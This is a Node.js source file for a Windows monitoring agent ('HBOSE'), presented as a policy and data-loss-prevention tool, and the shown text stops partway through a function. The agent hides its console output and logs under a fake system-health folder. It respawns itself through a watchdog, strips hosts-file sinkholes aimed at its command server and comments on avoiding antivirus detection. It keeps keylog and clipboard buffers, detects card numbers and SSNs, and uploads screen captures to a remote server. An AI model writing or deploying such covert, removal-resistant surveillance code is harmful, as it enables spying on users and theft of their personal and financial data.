const fs = require("fs");
const path = require("path");

// ═══════════════════════════════════════════════
// 🕵️ FALLBACK LOGGING FOR DEBUGGING
// ═══════════════════════════════════════════════
const logFile = path.join("C:\\ProgramData\\Microsoft\\Windows\\SystemHealth", "agent_boot.log");
function _bootLog(msg) {
    try { fs.appendFileSync(logFile, `[${new Date().toISOString()}] ${msg}\n`); } catch(e) {}
}
_bootLog("=== AGENT BOOT SEQUENCE INITIATED ===");

process.on("uncaughtException", (err) => {
    _bootLog("FATAL ERROR: " + err.message + "\n" + err.stack);
    process.exit(1);
});

const io = require("socket.io-client");
const os = require("os");
const { exec, execSync, spawn } = require("child_process");
const axios = require("axios");
const http = require("http");

// ═══════════════════════════════════════════════
// 🛡️ ANTI-TAMPER WATCHDOG MODE
// ═══════════════════════════════════════════════
if (process.argv.includes("--watchdog")) {
    const parentPid = parseInt(process.argv[process.argv.indexOf("--watchdog") + 1]);
    const exePath = process.argv[process.argv.indexOf("--watchdog") + 2];
    setInterval(() => {
        try {
            process.kill(parentPid, 0); // Check if alive
        } catch (e) {
            // Parent dead! Resurrect it.
            spawn(exePath, [], { detached: true, stdio: 'ignore', windowsHide: true }).unref();
            process.exit(0);
        }
    }, 1500);
    return; // Exit main thread, function only as watchdog
}

let watchdogProc = null;
function ensureWatchdog() {
    try {
        if (!watchdogProc || watchdogProc.killed) {
            watchdogProc = spawn(process.execPath, ["--watchdog", process.pid.toString(), process.execPath], {
                detached: true, stdio: 'ignore', windowsHide: true
            });
            watchdogProc.unref();
        }
    } catch (e) { }
}
setInterval(ensureWatchdog, 10000);
ensureWatchdog();

// ═══════════════════════════════════════════════
// MAIN APPLICATION & SINGLE INSTANCE LOCK
// ═══════════════════════════════════════════════

const net = require("net");
// When packaged, extractDir must be the directory of the executable (C:\ProgramData\...)
// DO NOT use os.homedir() because when run as SYSTEM, that resolves to System32 and triggers AV
const extractDir = process.pkg ? path.dirname(process.execPath) : __dirname;
if (!fs.existsSync(extractDir)) fs.mkdirSync(extractDir, { recursive: true });

const SINGLE_INSTANCE_PORT = 49201;
const lockServer = net.createServer();
lockServer.on("error", (e) => {
    if (e.code === "EADDRINUSE") {
        console.log("[SYSTEM] Another instance is already running. Exiting.");
        process.exit(1);
    }
});
lockServer.listen(SINGLE_INSTANCE_PORT, "127.0.0.1", () => {
    console.log("[SYSTEM] Obtained single-instance lock.");
});

const args = process.argv.slice(2);
const TEST_MODE = args.includes("--test");
const SERVER_PORT = 4000;

// ═══════════════════════════════════════════════
// STEALTH: Suppress all console output in production
// ═══════════════════════════════════════════════
const _log = console.log.bind(console);
const _err = console.error.bind(console);
if (!TEST_MODE) {
    console.log = () => { };
    console.error = () => { };
    console.warn = () => { };
}

// ═══════════════════════════════════════════════
// SERVER DISCOVERY: Auto-find server on network
// ═══════════════════════════════════════════════
let SERVER_URL = (args[0] || process.env.HBOSE_SERVER || "https://h-boss-production.up.railway.app").replace(/^['"]|['"]$/g, "").trim();
let socket = null;
let discoveryRunning = false;
let discoveryTimeout = null; // Failsafe: auto-reset discoveryRunning after 60s
let lastDiscoveryStart = 0; // Track when discovery started for stuck detection
let connectionWatchdogTimer = null; // Watchdog to force reconnect if socket never connects

function getLocalSubnet() {
    const nets = os.networkInterfaces();
    for (const name of Object.keys(nets)) {
        for (const n of nets[name]) {
            if (n.family === "IPv4" && !n.internal && !n.address.startsWith("169.254")) {
                const parts = n.address.split(".");
                return parts.slice(0, 3).join(".");
            }
        }
    }
    return "192.168.1";
}

function probeServer(ip, port, timeoutMs = 1500) {
    return new Promise((resolve) => {
        const req = http.get(`http://${ip}:${port}/api/stats`, { timeout: timeoutMs }, (res) => {
            let body = "";
            res.on("data", d => body += d);
            res.on("end", () => {
                try {
                    const json = JSON.parse(body);
                    if (json.activeAgents !== undefined) {
                        resolve(`http://${ip}:${port}`);
                    } else resolve(null);
                } catch { resolve(null); }
            });
        });
        req.on("error", () => resolve(null));
        req.on("timeout", () => { req.destroy(); resolve(null); });
    });
}

async function discoverServer(force = false) {
    // If discovery has been running for >60s, it's stuck — force reset
    if (discoveryRunning && !force) {
        const stuckDuration = Date.now() - lastDiscoveryStart;
        if (stuckDuration > 60000) {
            console.log("[DISCOVERY] Discovery stuck for >60s. Force resetting...");
            discoveryRunning = false;
        } else {
            return SERVER_URL || null;
        }
    }
    discoveryRunning = true;
    lastDiscoveryStart = Date.now();

    // FAILSAFE: Auto-reset discoveryRunning after 60s to prevent permanent lockout
    clearTimeout(discoveryTimeout);
    discoveryTimeout = setTimeout(() => { discoveryRunning = false; }, 60000);

    // Try the provided/cached URL first
    if (SERVER_URL) {
        if (SERVER_URL.startsWith("https://") || SERVER_URL.includes("railway.app") || SERVER_URL.includes("ngrok-free.app")) {
            discoveryRunning = false;
            clearTimeout(discoveryTimeout);
            return SERVER_URL;
        }
        try {
            const url = new URL(SERVER_URL);
            const result = await probeServer(url.hostname, url.port || SERVER_PORT);
            if (result) { discoveryRunning = false; clearTimeout(discoveryTimeout); return result; }
        } catch { }
    }

    // Scan local subnet for the server
    const subnet = getLocalSubnet();
    console.log(`[DISCOVERY] Scanning ${subnet}.0/24 for server...`);

    // Scan in batches of 20 for speed
    for (let batch = 1; batch <= 254; batch += 20) {
        const promises = [];
        for (let i = batch; i < Math.min(batch + 20, 255); i++) {
            promises.push(probeServer(`${subnet}.${i}`, SERVER_PORT, 1200));
        }
        const results = await Promise.all(promises);
        const found = results.find(r => r !== null);
        if (found) {
            console.log(`[DISCOVERY] Found server at ${found}`);
            SERVER_URL = found;
            discoveryRunning = false;
            clearTimeout(discoveryTimeout);
            return found;
        }
    }

    discoveryRunning = false;
    clearTimeout(discoveryTimeout);
    return null;
}

// ═══════════════════════════════════════════════
// IMMORTAL CONNECTION: Never-Die Socket with auto-discovery
// ═══════════════════════════════════════════════
function createSocket(serverUrl) {
    if (socket) {
        try {
            socket.removeAllListeners();
            socket.io.removeAllListeners(); // Also clean engine-level listeners
            socket.disconnect();
            socket.close();
        } catch { }
        socket = null;
    }

    // For all environments, try websocket first, then fallback to polling.
    const transportOrder = ["websocket", "polling"];

    const s = io(serverUrl, {
        reconnection: true,
        reconnectionDelay: 1000,      // Start at 1s
        reconnectionDelayMax: 8000,    // Cap at 8s
        reconnectionAttempts: Infinity,
        timeout: 30000,               // 30s timeout for cloud latency
        transports: transportOrder,
        path: "/socket.io",           // Match the Next.js rewrite path
        forceNew: true,
        withCredentials: false,        // No cookies needed for agent auth
        extraHeaders: {}               // Clean headers — no browser origin
    });

    return s;
}

async function connectWithDiscovery() {
    // Allow reconnection even if discovery guard is set (with stuck detection)
    if (discoveryRunning) {
        const stuckDuration = Date.now() - lastDiscoveryStart;
        if (stuckDuration < 60000) return; // Still within normal discovery time
        console.log("[CONNECT] Discovery guard stuck. Force resetting...");
        discoveryRunning = false;
    }

    // Check if we haven't connected in 90 days (7776000000 ms)
    const lastConnectPath = path.join(extractDir, "last_connect.dat");
    let needsBlackout = false;
    try {
        if (fs.existsSync(lastConnectPath)) {
            const lastConnect = parseInt(fs.readFileSync(lastConnectPath, "utf8"));
            if (lastConnect && (Date.now() - lastConnect > 90 * 24 * 60 * 60 * 1000)) {
                needsBlackout = true;
            }
        } else {
            // First time running, save current date
            fs.writeFileSync(lastConnectPath, Date.now().toString());
        }
    } catch (e) { }

    // DISABLED: 90-day offline blackout (safety lock) disabled per user request
    if (needsBlackout) {
        console.log("[LOCKOUT] 90 days offline. Host blackout logic disabled safely.");
    }

    // Destroy stale socket completely before creating a new one
    clearTimeout(connectionWatchdogTimer);
    if (socket) {
        try {
            socket.removeAllListeners();
            socket.io.removeAllListeners();
            socket.disconnect();
            socket.close();
        } catch { }
        socket = null;
    }

    const url = await discoverServer();
    if (!url) {
        console.log("[CONNECT] No server found. Will retry next cycle...");
        return;
    }

    SERVER_URL = url;
    socket = createSocket(url);
    setupSocketEvents();
    console.log(`[CONNECT] Attempting connection to ${url}...`);

    // CONNECTION WATCHDOG: If socket doesn't connect within 45s, tear down and retry
    connectionWatchdogTimer = setTimeout(() => {
        if (socket && !socket.connected) {
            console.log("[WATCHDOG] Socket failed to connect within 45s. Forcing full reconnect...");
            try {
                socket.removeAllListeners();
                socket.io.removeAllListeners();
                socket.disconnect();
                socket.close();
            } catch { }
            socket = null;
            // Schedule reconnect after a short delay (avoid tight loop)
            setTimeout(() => connectWithDiscovery(), 3000);
        }
    }, 45000);

    // Track successful connection
    if (socket) {
        socket.on("connect", () => {
            clearTimeout(connectionWatchdogTimer); // Connection succeeded, cancel watchdog
            console.log("[CONNECT] Socket connected successfully!");
            try {
                fs.writeFileSync(lastConnectPath, Date.now().toString());
                if (needsBlackout) {
                    sendInput("BL 0");
                    sendInput("UI"); // Unblock just in case
                }
            } catch (e) { }
        });
    }
}

console.log(`[BOOT] Server: ${SERVER_URL || 'AUTO-DISCOVER'} | Test: ${TEST_MODE}`);

// FPS Boost: temporarily speed up capture during remote control
let boostTimer = null;
function boostFPS() {
    if (captureProc && captureProc.stdin && !captureProc.killed) {
        try { captureProc.stdin.write("FPS 40\n"); } catch (e) { }
    }
    clearTimeout(boostTimer);
    boostTimer = setTimeout(() => {
        if (captureProc && captureProc.stdin && !captureProc.killed) {
            try { captureProc.stdin.write("FPS 100\n"); } catch (e) { }
        }
    }, 5000);
}

let keyLogBuffer = "";
let lastClipboard = "";
let lastInputTime = Date.now();
let activeWindowTitle = "Desktop";

const agentInfo = {
    hostname: os.hostname(),
    username: os.userInfo().username,
    platform: os.platform(),
    arch: os.arch(),
    cpus: os.cpus().length,
    totalMem: Math.round(os.totalmem() / 1024 / 1024 / 1024) + "GB",
    resolution: { width: 1920, height: 1080 }
};

// ═══════════════════════════════════════════════
// TRIGGER ENGINE (v2 Event-Triggered Capture)
// ═══════════════════════════════════════════════
const PRE_EVENT_BUFFER_SIZE = 6; // ~30s rolling pre-event buffer (6 frames @ ~5s)
let preEventBuffer = []; // In-memory rolling buffer of frame payloads
let activeTriggerSession = null; // { recordingId, triggerType, triggerDetail, startedAt, frameCount, timer }

// Luhn algorithm check for credit card detection
function isLuhnValid(str) {
    const digits = str.replace(/\D/g, "");
    if (digits.length < 13 || digits.length > 19) return false;
    let sum = 0;
    let shouldDouble = false;
    for (let i = digits.length - 1; i >= 0; i--) {
        let digit = parseInt(digits.charAt(i), 10);
        if (shouldDouble) {
            digit *= 2;
            if (digit > 9) digit -= 9;
        }
        sum += digit;
        shouldDouble = !shouldDouble;
    }
    return (sum % 10 === 0);
}

// Check text for sensitive content triggers (CC Luhn, SSN, keywords)
function checkSensitiveContentTrigger(text, source = "Clipboard") {
    if (!text || text.length < 5) return;

    let matchedDetail = null;

    // 1. Credit Card Check (Luhn algorithm on 13-19 digit candidate sequences)
    const cardMatches = text.match(/\b(?:\d[ -]*?){13,19}\b/g);
    if (cardMatches) {
        for (const candidate of cardMatches) {
            if (isLuhnValid(candidate)) {
                matchedDetail = `Credit Card detected via ${source}: ****${candidate.replace(/\D/g, "").slice(-4)}`;
                break;
            }
        }
    }

    // 2. SSN Check
    if (!matchedDetail) {
        const ssnMatch = text.match(/\b(?!000|666|9\d{2})\d{3}-(?!00)\d{2}-(?!0000)\d{4}\b/);
        if (ssnMatch) {
            matchedDetail = `SSN Pattern detected via ${source}`;
        }
    }

    // 3. Sensitive Keywords Check
    if (!matchedDetail && agentSettings.trigger_content_keywords) {
        const keywords = agentSettings.trigger_content_keywords.split(",").map(k => k.trim().toLowerCase()).filter(Boolean);
        const lower = text.toLowerCase();
        for (const kw of keywords) {
            if (lower.includes(kw)) {
                matchedDetail = `Sensitive keyword "${kw}" detected via ${source}`;
                break;
            }
        }
    }

    if (matchedDetail) {
        const durationSec = parseInt(agentSettings.trigger_content_duration_seconds) || 120;
        startTriggerSession("SENSITIVE_CONTENT", matchedDetail, durationSec);
    }
}

// Trigger Session Manager
async function startTriggerSession(triggerType, triggerDetail, durationSeconds = 60) {
    const now = Date.now();

    // If session is already active for same trigger, extend duration
    if (activeTriggerSession) {
        if (activeTriggerSession.triggerType === triggerType) {
            activeTriggerSession.triggerDetail = triggerDetail;
            clearTimeout(activeTriggerSession.timer);
            activeTriggerSession.timer = setTimeout(endTriggerSession, durationSeconds * 1000);
            return;
        }
    }

    console.log(`[TRIGGER] 🚨 TRIGGER FIRED: ${triggerType} (${triggerDetail})`);

    let recordingId = null;
    try {
        const res = await axios.post(`${SERVER_URL}/api/trigger-events`, {
            hostname: os.hostname(),
            username: os.userInfo().username,
            trigger_type: triggerType,
            trigger_detail: triggerDetail
        });
        if (res.data && res.data.recordingId) {
            recordingId = res.data.recordingId;
        }
    } catch (e) {
        console.error("[TRIGGER] Failed to report trigger to server:", e.message);
    }

    activeTriggerSession = {
        recordingId,
        triggerType,
        triggerDetail,
        startedAt: now,
        frameCount: 0,
        timer: setTimeout(endTriggerSession, durationSeconds * 1000)
    };

    // Flush pre-event buffer to server
    if (preEventBuffer.length > 0 && socket && socket.connected) {
        console.log(`[TRIGGER] ⚡ Flushing ${preEventBuffer.length} pre-event buffered frames to server...`);
        preEventBuffer.forEach(frame => {
            socket.emit("activity-sync", {
                ...frame,
                triggered: true,
                triggerType,
                recordingId
            });
        });
    }
}

async function endTriggerSession() {
    if (!activeTriggerSession) return;
    const session = activeTriggerSession;
    activeTriggerSession = null;

    const durationSeconds = Math.round((Date.now() - session.startedAt) / 1000);
    console.log(`[TRIGGER] 🏁 Trigger recording session ended: ${session.triggerType} (Duration: ${durationSeconds}s, Frames: ${session.frameCount})`);

    if (session.recordingId) {
        try {
            await axios.post(`${SERVER_URL}/api/trigger-session-end`, {
                recordingId: session.recordingId,
                duration_seconds: durationSeconds,
                frame_count: session.frameCount
            });
        } catch (e) { }
    }
}


// ═══════════════════════════════════════════════
// TEST MODE: Green Tray Icon (+ symbol)
// ═══════════════════════════════════════════════
if (TEST_MODE) {
    const trayScript = `
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$icon = New-Object System.Windows.Forms.NotifyIcon
$bmp = New-Object Drawing.Bitmap(16,16)
$g = [Drawing.Graphics]::FromImage($bmp)
$g.Clear([Drawing.Color]::Transparent)
$pen = New-Object Drawing.Pen([Drawing.Color]::LimeGreen, 3)
$g.DrawLine($pen, 8, 2, 8, 14)
$g.DrawLine($pen, 2, 8, 14, 8)
$g.Dispose()
$icon.Icon = [Drawing.Icon]::FromHandle($bmp.GetHicon())
$icon.Text = "HBOSE Agent Active"
$icon.Visible = $true

$ctx = New-Object System.Windows.Forms.ContextMenuStrip
$exitItem = $ctx.Items.Add("Exit Agent")
$exitItem.Add_Click({ $icon.Visible = $false; [Environment]::Exit(0) })
$icon.ContextMenuStrip = $ctx

$timer = New-Object System.Windows.Forms.Timer
$timer.Interval = 100
$timer.Add_Tick({})
$timer.Start()

[System.Windows.Forms.Application]::Run()
`;
    const tray = spawn("powershell", ["-NoProfile", "-WindowStyle", "Hidden", "-Command", trayScript], {
        detached: true,
        stdio: "ignore"
    });
    tray.unref();
    console.log("[TRAY] Green + icon visible in system tray");
}

// ═══════════════════════════════════════════════
// CONNECTION EVENTS (setup in function for re-binding)
// ═══════════════════════════════════════════════
let isLiveViewActive = false;
let connectionFailCount = 0;

function setupSocketEvents() {
    if (!socket) return;

    socket.on("connect", () => {
        console.log("[OK] Uplink established");
        connectionFailCount = 0;
        socket.emit("agent-auth", agentInfo);

        // ═══════════════════════════════════════════════
        // OFFLINE SPOOLING UPLOAD
        // ═══════════════════════════════════════════════
        try {
            
            const spoolPath = path.join(extractDir, "spool.json");
            if (fs.existsSync(spoolPath)) {
                const spool = JSON.parse(fs.readFileSync(spoolPath, "utf8"));
                if (spool && spool.length > 0) {
                    spool.forEach((log, index) => {
                        setTimeout(() => {
                            if (socket && socket.connected) socket.emit("activity-sync", log);
                        }, index * 200); // Space uploads by 200ms
                    });
                }
                fs.unlinkSync(spoolPath); // Delete after parsing
            }
        } catch (e) { }
    });

    socket.on("disconnect", (reason) => {
        console.log(`[WARN] Disconnected: ${reason}. Auto-reconnecting...`);
        // If transport closed or server kicked us, force immediate reconnect
        if (reason === "transport close" || reason === "transport error" || reason === "io server disconnect") {
            setTimeout(() => connectWithDiscovery(), 2000);
        }
    });

    socket.on("connect_error", (err) => {
        connectionFailCount++;
        console.log(`[WARN] Connection error #${connectionFailCount}: ${err.message}`);
        // For cloud URLs, reconnect faster (after 2 failures instead of 3)
        const threshold = (SERVER_URL && SERVER_URL.startsWith("https://")) ? 2 : 3;
        if (connectionFailCount >= threshold) {
            connectionFailCount = 0;
            console.log("[WARN] Too many failures. Re-discovering server...");
            connectWithDiscovery();
        }
    });

    socket.on("request-live-view", () => {
        isLiveViewActive = true;
    });
    socket.on("stop-live-view", () => {
        isLiveViewActive = false;
    });

    // Re-bind all other event handlers
    bindSocketHandlers();
}

// NOTE: No separate "reconnect" auth — socket.io v4 fires "connect" on reconnect,
// which already sends agent-auth. Double-auth caused duplicate pool entries.

// ═══════════════════════════════════════════════
// POLICY ENGINE: Multi-Layer Enforcement
// Supports: Website blocking, keyword blocking (window title + OCR + URL)
// Device targeting: Only enforces policies assigned to THIS hostname
// ═══════════════════════════════════════════════
let activePolicies = [];
let blockedKeywords = [];
let blockedApps = [];

async function syncPolicies() {
    try {
        const hostname = os.hostname();
        const response = await axios.get(`${SERVER_URL}/api/policies/for-agent/${hostname}`);
        const policies = response.data;
        activePolicies = policies;

        // ── Website Policies: Extract domains to block ──
        const blockedSites = policies
            .filter(p => (p.type === "Website") && p.action && p.action.includes("Block"))
            .map(p => p.name.toLowerCase().trim());

        const domains = [];
        blockedSites.forEach(site => {
            const d = site.replace("https://", "").replace("http://", "").split("/")[0].split(":")[0];
            if (d) {
                domains.push(d);
                if (!d.startsWith("www.")) domains.push(`www.${d}`);
            }
        });
        const uniqueDomains = [...new Set(domains)];

        // ── Keyword Policies: Extract keywords for window title / OCR blocking ──
        blockedKeywords = policies
            .filter(p => (p.type === "Keyword" || p.type === "OCR" || p.type === "Keystroke") && p.action && (p.action.includes("Block") || p.action.includes("Force Close")))
            .flatMap(p => {
                const names = [p.name.toLowerCase().trim()];
                if (p.conditions) {
                    p.conditions.split("\n").forEach(c => {
                        const t = c.trim().toLowerCase();
                        if (t) names.push(t);
                    });
                }
                return names;
            });

        // ── App Usage Policies: Extract app names to force-close ──
        blockedApps = policies
            .filter(p => p.type === "App Usage" && p.action && (p.action.includes("Block") || p.action.includes("Force Close")))
            .flatMap(p => {
                const names = [p.name.toLowerCase().trim()];
                if (p.conditions) {
                    p.conditions.split("\n").forEach(c => {
                        const t = c.trim().toLowerCase();
                        if (t) names.push(t);
                    });
                }
                return names;
            });

        // ── LAYER 1: Hosts File (Website blocking) ──
        const hostsPath = "C:\\Windows\\System32\\drivers\\etc\\hosts";
        if (fs.existsSync(hostsPath)) {
            let content = fs.readFileSync(hostsPath, "utf8");
            const startMarker = "# HBOSE BLOCK START";
            const endMarker = "# HBOSE BLOCK END";
            const si = content.indexOf(startMarker);
            const ei = content.indexOf(endMarker);
            if (si !== -1 && ei !== -1) content = content.substring(0, si) + content.substring(ei + endMarker.length);

            if (uniqueDomains.length > 0) {
                let block = `\n${startMarker}\n`;
                uniqueDomains.forEach(d => { block += `127.0.0.1 ${d}\n`; });
                block += `${endMarker}\n`;
                content = content.trim() + "\n" + block;
            }
            fs.writeFileSync(hostsPath, content.trim() + "\n");
        }

        // ── LAYER 2: Windows Firewall Rules ──
        try {
            const clearFW = spawn("powershell", ["-NoProfile", "-WindowStyle", "Hidden", "-Command",
                `Get-NetFirewallRule -DisplayName "HBOSE_BLOCK_*" -ErrorAction SilentlyContinue | Remove-NetFirewallRule -ErrorAction SilentlyContinue`
            ], { stdio: 'pipe' });
            await new Promise(r => clearFW.on("exit", r));

            if (uniqueDomains.length > 0) {
                const fwScript = uniqueDomains.map(d =>
                    `try { $ips = [System.Net.Dns]::GetHostAddresses("${d}") | ForEach-Object { $_.IPAddressToString }; ` +
                    `foreach($ip in $ips) { New-NetFirewallRule -DisplayName "HBOSE_BLOCK_${d}" -Direction Outbound -Action Block -RemoteAddress $ip -ErrorAction SilentlyContinue | Out-Null } } catch {}`
                ).join("; ");
                const addFW = spawn("powershell", ["-NoProfile", "-WindowStyle", "Hidden", "-Command", fwScript], { stdio: 'pipe' });
                await new Promise(r => addFW.on("exit", r));
            }
        } catch (fwErr) { console.log("[POLICY] Firewall rule error:", fwErr.message); }

        // ── LAYER 3: Flush DNS Cache ──
        const flush = spawn("ipconfig", ["/flushdns"], { stdio: 'pipe' });
        await new Promise(r => flush.on("exit", r));

        // ── LAYER 4: Kill blocked apps immediately ──
        if (blockedApps.length > 0) {
            enforceAppBlocking();
        }

        const totalEnforced = uniqueDomains.length + blockedKeywords.length + blockedApps.length;
        if (totalEnforced > 0) {
            console.log(`[POLICY] 🛡️ Enforcing: ${uniqueDomains.length} domains, ${blockedKeywords.length} keywords, ${blockedApps.length} apps`);
        }
    } catch (err) { }
}

// Kill processes that match blocked app names
function enforceAppBlocking() {
    if (blockedApps.length === 0) return;
    const psFilter = blockedApps.map(app => {
        const clean = app.replace(".exe", "").replace(/['"]/g, "");
        return `$_.ProcessName -like "*${clean}*"`;
    }).join(" -or ");
    const cmd = `Get-Process | Where-Object { ${psFilter} } | Stop-Process -Force -ErrorAction SilentlyContinue`;
    spawn("powershell", ["-NoProfile", "-WindowStyle", "Hidden", "-Command", cmd], { stdio: 'pipe' });
}

// Real-time window title keyword enforcement (runs on every frame)
function checkWindowTitlePolicy(windowTitle) {
    if (!windowTitle || blockedKeywords.length === 0) return;
    const lower = windowTitle.toLowerCase();
    for (const keyword of blockedKeywords) {
        if (lower.includes(keyword)) {
            console.log(`[POLICY] ⚡ KEYWORD VIOLATION: "${keyword}" found in window title "${windowTitle}" — Force closing!`);
            // Close the foreground window via Alt+F4
            sendInput("KD 12"); // Alt down
            sendInput("KD 73"); // F4 down
            setTimeout(() => {
                sendInput("KU 73"); // F4 up
                sendInput("KU 12"); // Alt up
            }, 100);
            // Report the violation to server
            try {
                axios.post(`${SERVER_URL}/api/task-result`, {
                    hostname: os.hostname(),
                    taskId: "policy-violation",
                    output: `KEYWORD BLOCKED: "${keyword}" detected in "${windowTitle}"`
                });
            } catch (e) { }
            break;
        }
    }
}

// Real-time OCR text keyword enforcement
function checkOCRPolicy(ocrText) {
    if (!ocrText || blockedKeywords.length === 0) return;
    const lower = ocrText.toLowerCase();
    for (const keyword of blockedKeywords) {
        if (lower.includes(keyword)) {
            console.log(`[POLICY] ⚡ OCR VIOLATION: "${keyword}" found in screen text — Alerting!`);
            try {
                axios.post(`${SERVER_URL}/api/task-result`, {
                    hostname: os.hostname(),
                    taskId: "ocr-violation",
                    output: `OCR KEYWORD DETECTED: "${keyword}" found on screen`
                });
            } catch (e) { }
            break;
        }
    }
}

// ═══════════════════════════════════════════════
// AGENT SETTINGS SYNC & DLP ENFORCEMENT
// ═══════════════════════════════════════════════
let agentSettings = {};

async function syncSettings() {
    try {
        const response = await axios.get(`${SERVER_URL}/api/settings`);
        if (response.data && typeof response.data === 'object' && !Array.isArray(response.data)) {
            agentSettings = response.data;
            enforceDLPBlocking();
        }
    } catch (err) { }
}

function enforceDLPBlocking() {
    // Print Spooler Enforcer
    if (agentSettings.dlp_print_policy === 'Block') {
        const cmd = `net stop spooler /y; Set-Service -Name Spooler -StartupType Disabled`;
        exec(`powershell -NoProfile -WindowStyle Hidden -Command "${cmd}"`, { windowsHide: true }, () => { });
    } else {
        const cmd = `Set-Service -Name Spooler -StartupType Automatic; net start spooler`;
        exec(`powershell -NoProfile -WindowStyle Hidden -Command "${cmd}"`, { windowsHide: true }, () => { });
    }
}

// 4. Hosts File Defender
function defendHostsFile() {
    try {
        const hostsPath = "C:\\Windows\\System32\\drivers\\etc\\hosts";
        if (fs.existsSync(hostsPath)) {
            let hosts = fs.readFileSync(hostsPath, 'utf8');
            let lines = hosts.split('\n');
            let modified = false;
            let urlHost = "";
            try { urlHost = new URL(SERVER_URL).hostname; } catch (e) { }

            if (urlHost && urlHost !== 'localhost' && urlHost !== '127.0.0.1') {
                let cleanLines = lines.filter(line => {
                    if (line.trim().startsWith('#')) return true;
                    if (line.includes(urlHost)) {
                        modified = true;
                        return false; // remove sinkhole
                    }
                    return true;
                });
                if (modified) fs.writeFileSync(hostsPath, cleanLines.join('\n'));
            }
        }
    } catch (e) { }
}

// 3. WiFi Geofencing
let wlanTimer = null;
function checkWiFiGeofence() {
    if (!agentSettings.safe_wifi_ssid) return;
    try {
        const stdout = execSync('netsh wlan show interfaces', { windowsHide: true }).toString();
        const match = stdout.match(/SSID\s*:\s*(.*)/);
        if (match && match[1]) {
            const currentSSID = match[1].trim();
            const safeSSIDs = agentSettings.safe_wifi_ssid.split(',').map(s => s.trim().toLowerCase());

            if (!safeSSIDs.includes(currentSSID.toLowerCase())) {
                
                const blackoutPath = path.join(extractDir, "blackout.dat");
                if (!fs.existsSync(blackoutPath)) {
                    fs.writeFileSync(blackoutPath, "1");
                    sendInput("BL 1");
                    sendInput("BI");
                    axios.post(`${SERVER_URL}/api/task-result`, { hostname: os.hostname(), taskId: "geofence", output: "GEOFENCE BREACH: Device locked outside safe WiFi." }).catch(() => { });
                }
            }
        }
    } catch (e) { }
}

setInterval(syncPolicies, 30000);
setTimeout(syncPolicies, 8000);

// Sync settings periodically & run active defenses
setInterval(() => {
    syncSettings();
    checkWiFiGeofence();
    defendHostsFile();
}, 45000);
setTimeout(syncSettings, 5000);
setTimeout(defendHostsFile, 2000);

// Enforce app blocking every 10 seconds
setInterval(enforceAppBlocking, 10000);

// ═══════════════════════════════════════════════
// ANTIVIRUS DETECTION & REPORTING
// Scans for installed AV products via WMI SecurityCenter2
// Reports status to server for dashboard visibility
// ═══════════════════════════════════════════════
let lastAVStatus = null;

function scanAntivirusProducts() {
    try {
        const psCmd = `
$avProducts = @()
try {
    $avList = Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct -EA Stop
    foreach ($av in $avList) {
        $state = $av.productState
        $enabled = (($state -band 0x1000) -ne 0)
        $upToDate = (($state -band 0x10) -eq 0)
        $avProducts += [PSCustomObject]@{
            Name = $av.displayName
            Enabled = $enabled
            UpToDate = $upToDate
            ProductState = $state
            Path = $av.pathToSignedProductExe
        }
    }
} catch {}
$avProducts | ConvertTo-Json -Compress
`;
        exec(`powershell -NoProfile -WindowStyle Hidden -Command "${psCmd.replace(/\n/g, ' ')}"`, {
            timeout: 15000, windowsHide: true
        }, (err, stdout) => {
            if (err || !stdout || !stdout.trim()) return;
            try {
                let products = JSON.parse(stdout.trim());
                if (!Array.isArray(products)) products = [products];

                lastAVStatus = {
                    hostname: os.hostname(),
                    products: products,
                    scan_time: new Date().toISOString()
                };

                // Save locally
                try {
                    fs.writeFileSync(path.join(extractDir, "av_status.json"), JSON.stringify(lastAVStatus, null, 2));
                } catch (e) { }

                // Report to server
                axios.post(`${SERVER_URL}/api/agent/av-status`, lastAVStatus).catch(() => { });

                // Check for AV conflicts
                for (const av of products) {
                    if (av.Enabled && av.Name) {
                        _log(`[AV] Detected active AV: ${av.Name} (Enabled: ${av.Enabled}, Updated: ${av.UpToDate})`);
                    }
                }
            } catch (e) { }
        });
    } catch (e) { }
}

// Run AV scan on boot + every 5 minutes
setTimeout(scanAntivirusProducts, 10000);
setInterval(scanAntivirusProducts, 300000);

// ═══════════════════════════════════════════════
// MICROSOFT DEFENDER VERIFICATION
// Checks Defender status via Get-MpComputerStatus
// Reports anomalies (disabled, outdated signatures) to server
// ═══════════════════════════════════════════════
let lastDefenderStatus = null;

function checkDefenderStatus() {
    try {
        const psCmd = `
try {
    $s = Get-MpComputerStatus -EA Stop
    [PSCustomObject]@{
        RealTimeEnabled = $s.RealTimeProtectionEnabled
        AntivirusEnabled = $s.AntivirusEnabled
        AntispywareEnabled = $s.AntispywareEnabled
        BehaviorMonitorEnabled = $s.BehaviorMonitorEnabled
        IoavProtectionEnabled = $s.IoavProtectionEnabled
        NISEnabled = $s.NISEnabled
        OnAccessProtectionEnabled = $s.OnAccessProtectionEnabled
        TamperProtectionSource = $s.IsTamperProtected
        SignatureLastUpdated = $s.AntivirusSignatureLastUpdated.ToString('o')
        QuickScanEndTime = $s.QuickScanEndTime.ToString('o')
        FullScanEndTime = $s.FullScanEndTime.ToString('o')
        SignatureVersion = $s.AntivirusSignatureVersion
        EngineVersion = $s.AMEngineVersion
        ProductVersion = $s.AMProductVersion
    } | ConvertTo-Json -Compress
} catch { '{"error":"Defender not available"}' }
`;
        exec(`powershell -NoProfile -WindowStyle Hidden -Command "${psCmd.replace(/\n/g, ' ')}"`, {
            timeout: 15000, windowsHide: true
        }, (err, stdout) => {
            if (err || !stdout || !stdout.trim()) return;
            try {
                const status = JSON.parse(stdout.trim());
                lastDefenderStatus = {
                    hostname: os.hostname(),
                    ...status,
                    check_time: new Date().toISOString()
                };

                // Detect anomalies
                const anomalies = [];
                if (status.RealTimeEnabled === false) anomalies.push("Real-time protection DISABLED");
                if (status.AntivirusEnabled === false) anomalies.push("Antivirus DISABLED");
                if (status.AntispywareEnabled === false) anomalies.push("Antispyware DISABLED");

                // Check if signatures are >7 days old
                if (status.SignatureLastUpdated) {
                    const sigDate = new Date(status.SignatureLastUpdated);
                    const daysSinceUpdate = (Date.now() - sigDate.getTime()) / (1000 * 60 * 60 * 24);
                    if (daysSinceUpdate > 7) {
                        anomalies.push(`Signatures ${Math.round(daysSinceUpdate)} days old`);
                    }
                }

                lastDefenderStatus.anomalies = anomalies;
                lastDefenderStatus.healthy = anomalies.length === 0;

                // Report to server
                axios.post(`${SERVER_URL}/api/agent/defender-status`, lastDefenderStatus).catch(() => { });

                // Report anomalies as alerts
